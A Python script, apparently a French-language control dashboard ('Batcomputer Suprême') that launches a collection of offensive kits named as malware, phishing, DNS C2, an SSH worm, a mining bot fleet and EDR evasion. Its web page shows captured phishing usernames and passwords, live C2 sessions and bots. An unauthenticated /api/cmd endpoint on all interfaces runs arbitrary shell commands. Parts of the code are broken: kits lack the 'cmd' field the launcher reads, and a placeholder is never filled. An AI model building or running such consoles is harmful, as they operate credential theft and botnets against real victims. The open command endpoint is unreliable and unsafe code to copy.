#!/usr/bin/env python3
# language: Python 3, file: batcomputer_supreme.py v2, target: macOS
# LE BATCOMPUTER SUPRÊME v2 — LE COCKPIT CINÉMATIQUE
# Toute l'arsenal DC dans une seule interface web avec animations temps réel,
# flux live, lancement des kits, captures, sessions, veille, scan, tout.
import http.server, urllib.request, urllib.parse, json, os, subprocess, time, threading, sys, html as _html

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 9000
TOOL_DC = os.path.expanduser("~/Desktop/tool_DC")

KITS = [
    {"id": "RickPortal", "name": "RickPortal", "icon": "🟢", "color": "#00ff70", "desc": "Kit malware complet", "tools": "10"},
    {"id": "FlashToolSuper", "name": "FLASH TOOL_SUPER", "icon": "⚡", "color": "#ffd60a", "desc": "55 tools · 6 pages", "tools": "55"},
    {"id": "BatCave", "name": "BATCAVE", "icon": "🦇", "color": "#ffd60a", "desc": "Investigation · 31 tools", "tools": "31"},
    {"id": "JokerChaos", "name": "JOKER CHAOS", "icon": "🃏", "color": "#9b30ff", "desc": "Chaos · 8 pranks", "tools": "8"},
    {"id": "TridentAquaman", "name": "TRIDENT", "icon": "🔱", "color": "#40e0d0", "desc": "Réseau · 8 tools", "tools": "8"},
    {"name": "SupermanVision", "id": "SupermanVision", "icon": "🦸", "color": "#ff4628", "desc": "Vision · 8 tools", "tools": "8"},
    {"name": "ConstantineDark", "id": "ConstantineDark", "icon": "🕯️", "color": "#90ff78", "desc": "Dark web · 10 tools", "tools": "10"},
    {"name": "LassoVerite", "id": "LassoVerite", "icon": "🪢", "color": "#ffdc50", "desc": "Vérification · 8 tools", "tools": "8"},
    {"name": "CyborgTech", "id": "CyborgTech", "icon": "🤖", "color": "#00c8ff", "desc": "Technet · 8 tools", "tools": "8"},
    {"name": "LexCorpIndustries", "id": "LexCorpIndustries", "icon": "🏢", "color": "#39ff14", "desc": "Windows · 7 modules", "tools": "7"},
    {"name": "STARLabs", "id": "STARLabs", "icon": "🔬", "color": "#00c8ff", "desc": "C2 DNS + framework", "tools": "5"},
    {"name": "TaskForceX", "id": "TaskForceX", "icon": "🎯", "color": "#ff6a00", "desc": "SSH worm + APK", "tools": "2"},
    {"name": "NeoMatrix", "id": "NeoMatrix", "icon": "💊", "color": "#00ff70", "desc": "La matrice · 10 tools", "tools": "10"},
    {"name": "ForceGalaxy", "id": "ForceGalaxy", "icon": "🌟", "color": "#ffd60a", "desc": "La galaxie · 8 tools", "tools": "8"},
    {"name": "CatwomanVoleuse", "id": "CatwomanVoleuse", "icon": "🐱", "color": "#ffdc50", "desc": "Secrets · 8 tools", "tools": "8"},
    {"name": "HiveMining", "id": "HiveMining", "icon": "🍯", "color": "#ffc800", "desc": "Minage · 8 tools", "tools": "8"},
    {"name": "ScarecrowPhish", "id": "ScarecrowPhish", "icon": "🎃", "color": "#ff8c30", "desc": "Phishing · 12 sites", "tools": "12"},
    {"name": "WarWorld", "id": "WarWorld", "icon": "⚔️", "color": "#ff4628", "desc": "Arsenal · 110 armes", "tools": "110"},
    {"name": "LeagueOfShadows", "id": "LeagueOfShadows", "icon": "🥷", "color": "#c9a600", "desc": "Orchestrateur", "tools": "4"},
    {"name": "KryptoniteSuite", "id": "KryptoniteSuite", "icon": "🟩", "color": "#39ff14", "desc": "Défense · Sigma/YARA", "tools": "4"},
    {"name": "WOPR", "id": "WOPR", "icon": "🎮", "color": "#7fff00", "desc": "Auto-lab CTF", "tools": "4"},
    {"name": "TheCalculator", "id": "TheCalculator", "icon": "📊", "color": "#00c8ff", "desc": "Breach analytics", "tools": "2"},
    {"name": "RavenEvasion", "id": "RavenEvasion", "icon": "🐦‍⬛", "color": "#8899ff", "desc": "Évasion EDR · 5 modules", "tools": "5"},
    {"name": "TheThinker", "id": "TheThinker", "icon": "🧠", "color": "#9b30ff", "desc": "Reverse engineering", "tools": "8"},
    {"name": "JokerCard", "id": "JokerCard", "icon": "🃏", "color": "#ff6a00", "desc": "SGP Card · BadUSB", "tools": "3"},
]

def read_json(path):
    try: return json.load(open(os.path.expanduser(path)))
    except Exception: return {}

def get_news():
    d = read_json(f"{TOOL_DC}/DailyPlanet/veille_cache.json")
    return d.get("items", [])[:10]

def get_captures():
    d = read_json(f"{TOOL_DC}/ScarecrowPhish/sorties/mirror_captures.json")
    return d[-5:] if d else []

def get_sessions():
    try:
        return json.loads(urllib.request.urlopen("http://127.0.0.1:5050/sessions", timeout=3).read())
    except Exception: return {}

def get_fleet():
    return read_json(f"{TOOL_DC}/HiveMining/sorties/flotte.json")

def get_scan():
    return read_json(f"{TOOL_DC}/KryptoniteSuite/sorties/scan.json")

def get_breaches():
    return read_json(f"{TOOL_DC}/TheCalculator/calculator_data.json")

PAGE = r"""<!doctype html><html lang="fr"><head><meta charset="utf-8">
<title>LE BATCOMPUTER SUPRÊME</title>
<style>
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
@keyframes glow{0%,100%{box-shadow:0 0 8px #ffd60a}50%{box-shadow:0 0 28px #ffd60a}}
@keyframes scanline{0%{top:0;opacity:1}50%{top:96%;opacity:.5}100%{top:0;opacity:1}}
@keyframes rain{from{transform:translateY(-100%)}to{transform:translateY(100%)}}
@keyframes flicker{0%,100%{opacity:1}48%{opacity:1}50%{opacity:.6}52%{opacity:1}}
@keyframes breathe{0%,100%{box-shadow:0 0 12px rgba(255,214,10,.3)}50%{box-shadow:0 0 40px rgba(255,214,10,.6)}}
*{box-sizing:border-box}
body{background:#020208;color:#ddd;font-family:monospace;margin:0;padding:0;overflow-x:hidden}
header{background:linear-gradient(180deg,#000 60%,#0a0a1a);padding:28px 30px 16px;position:relative;overflow:hidden}
header::after{content:'';position:absolute;top:0;left:0;right:0;bottom:0;
  background:linear-gradient(90deg,transparent,rgba(255,214,10,.05),transparent);
  animation:scanline 4s infinite;pointer-events:none}
.bat-signal{position:absolute;top:10px;left:50%;transform:translateX(-50%);
  width:200px;height:100px;background:radial-gradient(ellipse,#ffd60a22,#0000);
  border-radius:50%;animation:pulse 3s infinite;pointer-events:none}
h1{color:#ffd60a;font-size:2.2em;margin:0;text-align:center;letter-spacing:3px;
  text-shadow:0 0 20px rgba(255,214,10,.5);animation:flicker 4s infinite}
h1 b{color:#ff4628}
h1 small{display:block;color:#c33;font-size:.35em;letter-spacing:8px;font-style:italic;margin-top:4px}
#scanline{position:fixed;top:0;left:0;right:0;height:2px;z-index:999;
  background:linear-gradient(90deg,transparent,#ffd60a44,transparent);animation:scanline 5s infinite}
.stats{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin:16px 0;padding:0 20px}
.stat{background:#0a0a14;border:1px solid #222;border-radius:8px;padding:10px 20px;text-align:center;min-width:100px}
.stat b{color:#ffd60a;font-size:1.4em;display:block}
.stat span{color:#666;font-size:.78em}
.stat.hot{border-color:#ff4628;animation:pulse 2s infinite}
.stat.ok{border-color:#39ff14}
#layout{display:grid;grid-template-columns:300px 1fr;gap:16px;padding:0 20px}
#kits{background:#0a0a14;border:1px solid #1a1a2a;border-radius:12px;padding:14px;max-height:560px;overflow-y:auto}
#kits::-webkit-scrollbar{width:4px}#kits::-webkit-scrollbar-thumb{background:#ffd60a33;border-radius:4px}
.kit{display:flex;gap:10px;align-items:center;padding:10px;border:1px solid #1a1a2a;border-radius:8px;
  margin-bottom:6px;cursor:pointer;transition:all .15s}
.kit:hover{background:#1a1a2a;border-color:#ffd60a;transform:translateX(4px)}
.kit .icon{font-size:1.5em}
.kit .name{color:#e7e9ea;font-weight:bold;font-size:.9em}
.kit .desc{color:#666;font-size:.75em}
.kit .tools{color:#ffd60a;font-size:.7em}
.kit button{margin-left:auto;background:#ffd60a;color:#000;border:0;border-radius:5px;
  padding:5px 14px;cursor:pointer;font-weight:bold;font-size:.75em}
.kit button:hover{background:#fff;transform:scale(1.1)}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.card{background:#0a0a14;border:1px solid #1a1a2a;border-radius:10px;padding:14px;position:relative;overflow:hidden}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;
  background:linear-gradient(90deg,#ffd60a33,transparent,#ffd60a33)}
.card h3{color:#ffd60a;margin:0 0 10px;font-size:1em;display:flex;align-items:center;gap:8px}
.card h3::before{content:'';width:6px;height:6px;background:#ffd60a;border-radius:50%;animation:pulse 2s infinite}
.card ul{list-style:none;padding:0;margin:0;font-size:.85em}
.card li{padding:5px 0;border-bottom:1px solid #1a1a1a;color:#9ab;display:flex;gap:8px;align-items:center}
.card li:last-child{border-bottom:0}
.card li b{color:#ff6a00}
.card li .time{color:#555;font-size:.8em;margin-left:auto}
.badge{background:#1a1a2a;color:#c9a600;border-radius:4px;padding:1px 8px;font-size:.78em}
.empty{color:#555;font-style:italic}
.term{background:#000;border:1px solid #ffd60a33;border-radius:8px;padding:12px;height:200px;
  overflow-y:auto;white-space:pre-wrap;font-size:.8em;color:#7fff7f}
.term::-webkit-scrollbar{width:3px}.term::-webkit-scrollbar-thumb{background:#ffd60a33}
.liveline{width:6px;height:6px;border-radius:50%;background:#39ff14;animation:pulse 1.5s infinite}
.deadline{width:6px;height:6px;border-radius:50%;background:#f66}
#globalTerm{background:#000;border:1px solid #ffd60a33;border-radius:10px;padding:14px;
  height:200px;overflow-y:auto;font-size:.8em;color:#7fff7f;white-space:pre-wrap;margin:16px 20px}
#cmdline{width:100%;background:#0a0a14;border:1px solid #ffd60a;color:#ffd60a;padding:10px 16px;
  border-radius:8px;font-family:monospace;font-size:.95em}
#cmdline:focus{outline:none;box-shadow:0 0 12px rgba(255,214,10,.3)}
footer{text-align:center;color:#333;font-size:.75em;padding:20px;margin-top:30px}
</style></head><body>
<div id="scanline"></div>
<header>
  <div class="bat-signal"></div>
  <h1>LE BATCOMPUTER <b>SUPRÊME</b><small>26 KITS · ~240 TOOLS · POWERED BY MAXIME LEAL</small></h1>
</header>
<div class="stats" id="stats"></div>
<div id="layout">
  <div id="kits">
    <b style="color:#ffd60a;display:block;margin-bottom:10px">⚡ KITS — CLIC POUR LANCER</b>
    <div id="kitList"></div>
  </div>
  <div class="grid">
    <div class="card"><h3>📡 VEILLE CYBER</h3><ul id="news"><li class="empty">chargement…</li></ul></div>
    <div class="card"><h3>🎣 CAPTURES</h3><ul id="captures"><li class="empty">—</li></ul></div>
    <div class="card"><h3>🖥️ SESSIONS C2</h3><ul id="sessions"><li class="empty">—</li></ul></div>
    <div class="card"><h3>🍯 FLOTTE</h3><ul id="fleet"><li class="empty">—</li></ul></div>
    <div class="card"><h3>🟩 KRYPTONITE</h3><ul id="scan"><li class="empty">—</li></ul></div>
    <div class="card"><h3>📊 BREACHES</h3><ul id="breaches"><li class="empty">—</li></ul></div>
  </div>
</div>
<div style="padding:0 20px">
  <h3 style="color:#ffd60a;margin:16px 0 8px">⌨ TERMINAL GLOBAL</h3>
  <div id="globalTerm">$ le batcomputer écoute…</div>
  <input id="cmdline" placeholder="commande globale (ex: scan · refresh · launch BatCave · status)" autocomplete="off">
</div>
<footer>LE BATCOMPUTER SUPRÊME · powered by Maxime Leal · l'arsenal DC complet dans un seul écran</footer>
<script>
const KITS = __KITS__;
function esc(s){return (s||'').toString().replace(/</g,'&lt;');}
async function refresh(){
  try {
    const d = await (await fetch('/api/status')).json();
    document.getElementById('stats').innerHTML = `
      <div class="stat ok"><b>${d.kits}</b><span>KITS</span></div>
      <div class="stat ok"><b>${Object.keys(d.sessions||{}).length}</b><span>SESSIONS</span></div>
      <div class="stat"><b>${(d.news||[]).length}</b><span>ACTUS</span></div>
      <div class="stat"><b>${(d.captures||[]).length}</b><span>CAPTURES</span></div>
      <div class="stat"><b>${Object.keys(d.fleet||{}).length}</b><span>BOTS</span></div>
      <div class="stat ${((d.scan||[]).length > 0) ? 'hot' : ''}"><b>${(d.scan||[]).length}</b><span>IOCs</span></div>`;
    document.getElementById('kitList').innerHTML = KITS.map(k =>
      `<div class="kit" onclick="fetch('/api/launch?kit=${k.id}')">
        <span class="icon">${k.icon}</span>
        <div><div class="name">${k.name}</div><span class="desc">${k.desc}</span></div>
        <button>▶</button></div>`).join('');
    document.getElementById('news').innerHTML = (d.news||[]).map(n =>
      `<li><span class="badge">${esc(n.source)}</span> ${esc(n.titre).slice(0,80)}
       <span class="time">${esc(n.cat)}</span></li>`).join('') || '<li class="empty">veille vide</li>';
    document.getElementById('captures').innerHTML = (d.captures||[]).map(c =>
      `<li><span class="liveline"></span> <b>${esc(c.identifiant)}</b> / ${esc(c.mot_de_passe).slice(0,25)}
       <span class="time">${esc(c.ip)}</span></li>`).join('') || '<li class="empty">aucune capture</li>';
    document.getElementById('sessions').innerHTML = Object.entries(d.sessions||{}).map(([k,v]) =>
      `<li><span class="liveline"></span> <b>${k}</b> ${esc(v.ip)}<span class="time">${esc(v.time)}</span></li>`
    ).join('') || '<li class="empty">aucune session C2 active</li>';
    document.getElementById('fleet').innerHTML = Object.entries(d.fleet||{}).map(([k,v]) =>
      `<li><span class="${v.alive ? 'liveline' : 'deadline'}"></span> <b>${k}</b>
       <span class="time">${esc(v.host)}</span></li>`).join('') || '<li class="empty">flotte vide</li>';
    document.getElementById('scan').innerHTML = (d.scan||[]).slice(0,6).map(s =>
      `<li><span class="badge">${esc(s.kit)}</span> ${esc(s.type)} ${esc(s.detail).slice(0,60)}</li>`
    ).join('') || '<li class="empty">lance le scan kryptonite</li>';
    document.getElementById('breaches').innerHTML = (d.breaches||[]).map(b =>
      `<li><b>${esc(b[1])}</b> <span style="color:#ffd60a">${b[3].toLocaleString()}</span> <span class="badge">${esc(b[2])}</span></li>`
    ).join('') || '<li class="empty">calculator inactif</li>';
  } catch(e) { console.error(e); }
}
async function globalCmd(){
  const c = document.getElementById('cmdline').value;
  if (!c) return;
  document.getElementById('cmdline').value = '';
  const term = document.getElementById('globalTerm');
  term.innerHTML += '\n> ' + esc(c) + '\n';
  if (c === 'scan') { await fetch('/api/scan'); term.innerHTML += '[OK] scan kryptonite lancé\n'; }
  else if (c === 'refresh') { await fetch('/api/refresh'); term.innerHTML += '[OK] veille re-collectée\n'; }
  else if (c.startsWith('launch ')) {
    const kit = c.replace('launch ','').trim();
    const r = await (await fetch('/api/launch?kit=' + kit)).json();
    term.innerHTML += r.ok ? `[OK] ${r.launched} lancé\n` : `[X] kit inconnu\n`;
  }
  else if (c === 'status') { refresh(); term.innerHTML += '[OK] status rafraîchi\n'; }
  else { term.innerHTML += `[i] commandes: scan · refresh · launch <kit> · status\n`; }
  term.scrollTop = term.scrollHeight;
}
document.getElementById('cmdline').addEventListener('keydown', e => {
  if (e.key === 'Enter') globalCmd();
});
refresh(); setInterval(refresh, 8000);
</script></body></html>"""

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        u = urllib.parse.urlparse(self.path); q = urllib.parse.parse_qs(u.query)
        if u.path == "/api/status":
            self._json({
                "kits": len(KITS),
                "news": get_news(),
                "captures": get_captures(),
                "sessions": get_sessions(),
                "fleet": get_fleet(),
                "scan": get_scan(),
                "breaches": get_breaches(),
            })
        elif u.path == "/api/launch":
            folder = q.get("kit", [""])[0]
            kit = next((k for k in KITS if k["id"] == folder), None)
            if kit:
                path = os.path.join(TOOL_DC, kit["id"])
                subprocess.Popen(kit["cmd"], shell=True, cwd=path,
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self._json({"ok": True, "launched": kit["name"]})
            else: self._json({"ok": False, "err": "kit inconnu"})
        elif u.path == "/api/scan":
            subprocess.Popen("python3 kryptonite.py scan", shell=True,
                             cwd=os.path.join(TOOL_DC, "KryptoniteSuite"),
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._json({"ok": True, "msg": "scan lancé"})
        elif u.path == "/api/refresh":
            subprocess.Popen("python3 veille.py top 1 > /dev/null", shell=True,
                             cwd=os.path.join(TOOL_DC, "DailyPlanet"),
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._json({"ok": True, "msg": "veille re-collectée"})
        else: self._send_page()
    def do_POST(self):
        u = urllib.parse.urlparse(self.path)
        if u.path == "/api/cmd":
            n = int(self.headers.get("Content-Length", 0))
            cmd = self.rfile.read(n).decode()
            out = subprocess.run(cmd, shell=True, capture_output=True, timeout=15).stdout.decode()
            self._json({"out": out[:3000]})
        else: self._json({"err": "?"})
    def _json(self, d):
        b = json.dumps(d, ensure_ascii=False).encode()
        self.send_response(200); self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    def _send_page(self):
        page = PAGE.encode()
        self.send_response(200); self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(page))); self.end_headers(); self.wfile.write(page)
    def log_message(self, *a): pass

if __name__ == "__main__":
    print(f"[*] LE BATCOMPUTER SUPRÊME sur http://127.0.0.1:{PORT} — {len(KITS)} kits, {sum(int(k['tools']) for k in KITS)} tools")
    http.server.ThreadingHTTPServer(("0.0.0.0", PORT), H).serve_forever()
